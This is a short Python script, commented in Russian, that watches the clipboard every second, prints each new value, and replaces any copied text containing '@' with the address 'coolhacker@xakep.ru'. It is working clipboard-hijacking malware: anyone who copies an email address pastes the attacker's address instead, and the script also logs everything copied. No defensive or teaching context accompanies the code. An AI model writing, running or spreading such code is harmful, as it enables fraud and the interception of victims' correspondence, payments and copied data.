

import pyperclip

import time

old = ''

while True:
    # Кладем в переменную s содержимое буфера обмена
    s = pyperclip.paste()


    if "@" in s and (s != old):
        print(s)
        pyperclip.copy('coolhacker@xakep.ru')
        old = s
    elif (s != old):
        print(s)
        old = s
    time.sleep(1)
